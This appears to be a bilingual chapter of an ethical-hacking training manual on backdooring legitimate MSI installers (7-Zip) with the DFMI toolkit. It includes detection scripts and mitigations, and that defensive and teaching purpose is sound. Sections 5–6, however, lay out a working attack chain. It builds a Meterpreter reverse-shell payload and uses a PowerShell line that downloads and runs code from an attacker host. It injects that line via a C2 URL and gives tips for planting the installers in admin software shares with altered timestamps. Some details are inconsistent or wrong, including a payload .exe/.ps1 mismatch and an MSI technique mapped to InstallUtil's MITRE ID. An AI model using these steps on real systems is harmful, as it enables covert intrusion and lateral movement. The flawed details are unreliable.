@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 29 — Backdooring Installers with DFMI | Ch. 29</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 29 — Backdooring Installers with DFMI</h1>
+<div class="sub">Ch. 29 — Weaponizing MSI Installers</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🎯 Nível: Avançado / Red Team</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#setup">Setup</a></li><li><a href="#modules">Módulos</a></li>
+<li><a href="#inject">Injeção</a></li><li><a href="#delivery">Delivery</a></li>
+<li><a href="#impact">Scripts de Impacto</a></li><li><a href="#mitre">MITRE</a></li>
+<li><a href="#mitig">Mitigações</a></li><li><a href="#lab">Laboratório</a></li>
+<li><a href="#revq">Revisão</a></li><li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender o DFMI como toolkit de weaponização de instaladores MSI; instalar msitools e wixl; usar os três módulos (<code class="inline">inject</code>, <code class="inline">rogue-mst</code>, <code class="inline">stub</code>); injetar um payload PowerShell num MSI legítimo; manter o instalador funcional; compreender as limitações de assinatura e as mitigações; <strong>construir scripts de impacto nativos</strong> para validação e deteção.</span>
+<span class="en">Understand DFMI as an MSI installer weaponization toolkit; install msitools and wixl; use the three modules (<code class="inline">inject</code>, <code class="inline">rogue-mst</code>, <code class="inline">stub</code>); inject a PowerShell payload into a legitimate MSI; keep the installer functional; understand signature limitations and mitigations; <strong>build native impact scripts</strong> for validation and detection.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Em grandes empresas, é comum encontrar partilhas de ficheiros cheias de software que os administradores instalam em workstations e servidores. Alguns admins deixam essas partilhas totalmente acessíveis a qualquer pessoa, porque pensam que não há nada de valioso lá. Esses instaladores podem ser backdoored sem os quebrar. Da próxima vez que um administrador os executar, o backdoor corre com os seus privilégios, permitindo movimento lateral sem saber a password.</span>
+<span class="en">In big companies you often find file shares full of software that admins install on workstations and servers. Some admins leave those shares fully accessible to anyone, because they think there is nothing valuable. Those installers can be backdoored without breaking them. Next time an administrator runs it, the backdoor executes under their privileges, which can let you move laterally without knowing their password.</span>
+</div>
+</section>
+
+<section id="setup">
+<h2>3. Setup <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Antes de fazer backdoor a um instalador <code class="inline">.msi</code> com Kali, precisas de instalar o msitools e o wixl.</span>
+<span class="en">Before you can backdoor any <code class="inline">.msi</code> installer with Kali, you need msitools installed first.</span>
+</div>
+<pre>kali > sudo apt update
+kali > sudo apt install -y msitools wixl</pre>
+<div class="lang">
+<span class="pt">Depois descarrega o repositório e executa a ferramenta:</span>
+<span class="en">Then download the repository and run the tool:</span>
+</div>
+<pre>kali > git clone https://github.com/ccelikanil/DFMI.git
+kali > cd DFMI
+kali > python3 dfmi.py</pre>
+</section>
+
+<section id="modules">
+<h2>4. Módulos DFMI <span class="badge orig">Original</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O DFMI oferece três métodos distintos para abusar de ficheiros MSI :</span>
+<span class="en">DFMI offers three distinct methods for abusing MSI files :</span>
+</div>
+<table>
+<tr><th>Módulo</th><th>Função / Function</th><th>Limitação / Limitation</th></tr>
+<tr><td><code class="inline">inject</code></td><td>Injeta um CustomAction num MSI existente</td><td>Modifica o MSI (hash muda)</td></tr>
+<tr><td><code class="inline">rogue-mst</code></td><td>Gera um <code class="inline">.mst</code> (transform) que injeta o backdoor sem alterar o MSI original</td><td>Requer Windows para gerar o <code class="inline">.mst</code>; precisa de dois ficheiros no deploy</td></tr>
+<tr><td><code class="inline">stub</code></td><td>Cria um MSI malicioso de raiz, sem instalador original</td><td>Não tem assinatura legítima</td></tr>
+</table>
+<div class="callout info">
+<strong>Nota / Note:</strong>
+<div class="lang">
+<span class="pt">O artigo do Hackers-Arise foca-se apenas no módulo <code class="inline">inject</code>. O <code class="inline">rogue-mst</code> é a variante mais furtiva porque <strong>mantém a assinatura Authenticode do MSI original intacta</strong>.</span>
+<span class="en">The Hackers-Arise article focuses only on the <code class="inline">inject</code> module. <code class="inline">rogue-mst</code> is the stealthier variant because <strong>it keeps the original MSI's Authenticode signature intact</strong>.</span>
+</div>
+</div>
+</section>
+
+<section id="inject">
+<h2>5. Injeção com <code class="inline">inject</code> <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Escolhe um instalador MSI. O artigo usa o 7-Zip por ser comum.</span>
+<span class="en">Pick an MSI installer. The article uses 7-Zip because it's common.</span>
+</div>
+<pre>kali > wget https://github.com/ip7z/7zip/releases/download/26.03/7z2603-x64.msi -O 7zip_original.msi</pre>
+<div class="lang">
+<span class="pt">Gera o payload com Metasploit:</span>
+<span class="en">Generate the payload with Metasploit:</span>
+</div>
+<pre>kali > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o payload.exe</pre>
+<div class="lang">
+<span class="pt">Cria o script PowerShell que descarrega e executa o payload:</span>
+<span class="en">Create the PowerShell script that downloads and runs the payload:</span>
+</div>
+<pre>Invoke-WebRequest -Uri "http://IP:PORT/payload.exe" -OutFile "C:\Temp\payload.exe"; Start-Process "C:\Temp\payload.exe"</pre>
+<div class="lang">
+<span class="pt">Injeta o payload no instalador:</span>
+<span class="en">Inject the payload into the installer:</span>
+</div>
+<pre>kali > python3 dfmi.py inject 7zip_original.msi 7zip_backdoor.msi --c2 http://192.168.131.7:8000/payload.ps1</pre>
+<div class="lang">
+<span class="pt">O instalador resultante continua funcional. Quando a vítima o executa, uma janela de terminal aparece brevemente (comportamento comum em software legítimo) e a ligação C2 é estabelecida.</span>
+<span class="en">The resulting installer remains functional. When the victim runs it, a terminal window briefly pops up (common behavior in legitimate software) and the C2 connection is established.</span>
+</div>
+</section>
+
+<section id="delivery">
+<h2>6. Delivery <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Agrupa os backdoors num diretório e sobe um servidor HTTP para entregar à vítima:</span>
+<span class="en">Group the backdoors into a directory and set up an HTTP server to deliver them:</span>
+</div>
+<pre>kali > ls
+kali > python3 -m http.server</pre>
+<div class="lang">
+<span class="pt">Alterar o timestamp do ficheiro na partilha torna-o mais credível. O instalador backdoored pode ser colocado numa partilha de software existente, onde os admins o executam naturalmente.</span>
+<span class="en">Changing the file timestamp in the share makes it look more trustworthy. The backdoored installer can be placed in an existing software share, where admins run it naturally.</span>
+</div>
+</section>
+
+<section id="impact">
+<h2>7. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo ajudam o blue team a detetar e validar atividade compatível com DFMI.</span>
+<span class="en">The scripts below help the blue team detect and validate DFMI-compatible activity.</span>
+</div>
+
+<h3>7.1 Script 29.1 — Inspeção de MSI para CustomActions Suspeitas / MSI CustomAction Inspection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> usar o modo <code class="inline">inspect</code> do DFMI para listar CustomActions num MSI. <strong>Evidência:</strong> output no ecrã.</span>
+<span class="en"><strong>Goal:</strong> use DFMI's <code class="inline">inspect</code> mode to list CustomActions in an MSI. <strong>Evidence:</strong> on-screen output.</span>
+</div>
+<pre># Script 29.1 - MSI CustomAction Inspection
+param([Parameter(Mandatory)][string]$MsiPath)
+python3 dfmi.py inject --inspect $MsiPath</pre>
+
+<h3>7.2 Script 29.2 — Deteção de msiexec com Parâmetros Suspeitos / msiexec Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar <code class="inline">msiexec.exe</code> com <code class="inline">/qn</code> (silencioso) ou <code class="inline">TRANSFORMS=</code> em eventos 4688. <strong>Evidência:</strong> <code class="inline">msiexec-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect <code class="inline">msiexec.exe</code> with <code class="inline">/qn</code> (silent) or <code class="inline">TRANSFORMS=</code> in events 4688. <strong>Evidence:</strong> <code class="inline">msiexec-detect.csv</code>.</span>
+</div>
+<pre># Script 29.2 - msiexec Detection
+$out = ".\msiexec-detect.csv"
+$hits = @()
+Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $proc = ($xml.Event.EventData.Data | Where-Object Name -eq "NewProcessName").'#text'
+    $cmd  = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
+    if ($proc -match "msiexec\.exe" -and ($cmd -match "/qn" -or $cmd -match "TRANSFORMS=")) {
+      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Process=$proc; Command=$cmd }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] msiexec hits: $($hits.Count) -> $out" -ForegroundColor Yellow</pre>
+
+<h3>7.3 Script 29.3 — Verificação de Assinatura de MSI / MSI Signature Check</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> verificar se um MSI tem assinatura Authenticode válida (o <code class="inline">rogue-mst</code> mantém a assinatura, mas o <code class="inline">stub</code> e o <code class="inline">inject</code> não). <strong>Evidência:</strong> output no ecrã.</span>
+<span class="en"><strong>Goal:</strong> check if an MSI has a valid Authenticode signature (<code class="inline">rogue-mst</code> keeps it, but <code class="inline">stub</code> and <code class="inline">inject</code> don't). <strong>Evidence:</strong> on-screen output.</span>
+</div>
+<pre># Script 29.3 - MSI Signature Check
+param([Parameter(Mandatory)][string]$MsiPath)
+$sig = Get-AuthenticodeSignature -FilePath $MsiPath
+if ($sig.Status -eq "Valid") {
+  Write-Host "[+] Valid signature: $($sig.SignerCertificate.Subject)" -ForegroundColor Green
+} else {
+  Write-Host "[!] Invalid or missing signature: $($sig.Status)" -ForegroundColor Red
+}</pre>
+</section>
+
+<section id="mitre">
+<h2>8. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>Command and Scripting Interpreter: PowerShell</td><td>T1059.001</td><td>Payload <code class="inline">payload.ps1</code></td></tr>
+<tr><td>Ingress Tool Transfer</td><td>T1105</td><td>Download do payload via HTTP</td></tr>
+<tr><td>User Execution: Malicious File</td><td>T1204.002</td><td>Instalador backdoored</td></tr>
+<tr><td>Signed Binary Proxy Execution: InstallUtil</td><td>T1218.004</td><td>MSI como proxy (contexto)</td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>9. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Verificar assinaturas MSI</strong> — Script 29.3. O <code class="inline">rogue-mst</code> mantém a assinatura, mas o <code class="inline">inject</code> e o <code class="inline">stub</code> não.</li>
+<li><strong>Monitorizar <code class="inline">msiexec</code> com <code class="inline">/qn</code> e <code class="inline">TRANSFORMS=</code></strong> — Script 29.2.</li>
+<li><strong>Inspecionar CustomActions</strong> em MSIs não assinados — Script 29.1.</li>
+<li><strong>Restringir partilhas de software</strong> — apenas admins com necessidade devem poder escrever.</li>
+<li><strong>AppLocker/WDAC</strong> — bloquear MSIs não assinados ou de fontes não confiáveis.</li>
+<li><strong>Monitorizar downloads de MSI</strong> em workstations de admin.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>10. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> VM Windows isolada com snapshot. Kali com DFMI instalado. Transferir um MSI legítimo (7-Zip), injetar um payload de teste (calc.exe), instalar e verificar a assinatura. <strong>Objetivo:</strong> compreender a injeção e validar deteções.</span>
+<span class="en"><strong>Scenario:</strong> Isolated Windows VM with snapshot. Kali with DFMI installed. Download a legitimate MSI (7-Zip), inject a test payload (calc.exe), install, and verify signature. <strong>Goal:</strong> understand injection and validate detections.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>Instalar msitools</td><td><code class="inline">sudo apt install -y msitools wixl</code></td><td>Output</td></tr>
+<tr><td>2</td><td>Clonar DFMI</td><td><code class="inline">git clone https://github.com/ccelikanil/DFMI.git</code></td><td>Pasta DFMI</td></tr>
+<tr><td>3</td><td>Descarregar MSI</td><td><code class="inline">wget ...7z2603-x64.msi -O 7zip_original.msi</code></td><td>Ficheiro</td></tr>
+<tr><td>4</td><td>Injetar</td><td><code class="inline">python3 dfmi.py inject 7zip_original.msi 7zip_backdoor.msi --c2 http://KALI:8000/payload.ps1</code></td><td><code class="inline">7zip_backdoor.msi</code></td></tr>
+<tr><td>5</td><td>Inspecionar</td><td><code class="inline">.\msi-inspect.ps1 -MsiPath .\7zip_backdoor.msi</code></td><td>Output</td></tr>
+<tr><td>6</td><td>Verificar assinatura</td><td><code class="inline">.\msi-signature-check.ps1 -MsiPath .\7zip_backdoor.msi</code></td><td>Output</td></tr>
+<tr><td>7</td><td>Deteção msiexec</td><td><code class="inline">.\msiexec-detect.ps1</code></td><td><code class="inline">msiexec-detect.csv</code></td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="list">
+<li>msitools instalado</li>
+<li><code class="inline">7zip_backdoor.msi</code> gerado</li>
+<li>Output do <code class="inline">inspect</code></li>
+<li>Output da verificação de assinatura</li>
+<li><code class="inline">msiexec-detect.csv</code></li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>11. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>Porque é que os instaladores em partilhas são um vetor atrativo? / Why are installers in shares an attractive vector?</li>
+<li>Qual a diferença entre <code class="inline">inject</code>, <code class="inline">rogue-mst</code> e <code class="inline">stub</code>? / What's the difference between <code class="inline">inject</code>, <code class="inline">rogue-mst</code>, and <code class="inline">stub</code>?</li>
+<li>Porque é que o <code class="inline">rogue-mst</code> mantém a assinatura? / Why does <code class="inline">rogue-mst</code> keep the signature?</li>
+<li>O que faz o <code class="inline">payload.ps1</code> no fluxo do artigo? / What does <code class="inline">payload.ps1</code> do in the article's flow?</li>
+<li>Como se deteta um MSI backdoored? / How to detect a backdoored MSI?</li>
+<li>Porque é que o <code class="inline">stub</code> é mais fácil de detetar? / Why is <code class="inline">stub</code> easier to detect?</li>
+<li>Como se mitiga o risco de MSIs backdoored? / How to mitigate backdoored MSI risk?</li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>12. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo cobriu o DFMI como toolkit de weaponização de instaladores MSI: setup com msitools e wixl, os três módulos (<code class="inline">inject</code>, <code class="inline">rogue-mst</code>, <code class="inline">stub</code>), a injeção de um payload PowerShell num MSI legítimo (7-Zip) mantendo o instalador funcional, e a entrega via HTTP server ou partilha de software. O <code class="inline">rogue-mst</code> é a variante mais furtiva porque mantém a assinatura Authenticode intacta. Acrescentámos <strong>três scripts de impacto</strong> (inspeção de CustomActions, deteção de msiexec suspeito, verificação de assinatura) que ajudam o blue team. O Cap. 30 entra no Hunting Chinese APTs.</span>
+<span class="en">This chapter covered DFMI as an MSI installer weaponization toolkit: setup with msitools and wixl, the three modules (<code class="inline">inject</code>, <code class="inline">rogue-mst</code>, <code class="inline">stub</code>), injecting a PowerShell payload into a legitimate MSI (7-Zip) while keeping the installer functional, and delivery via HTTP server or software share. <code class="inline">rogue-mst</code> is the stealthier variant because it keeps the Authenticode signature intact. We added <strong>three impact scripts</strong> (CustomAction inspection, suspicious msiexec detection, signature check) that help the blue team. Ch. 30 moves into Hunting Chinese APTs.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 29 / Ethical Hacker Training Manual — Ch. 29</div>
+<div style="margin-top:.6rem">
+<a href="cap28.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap30.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
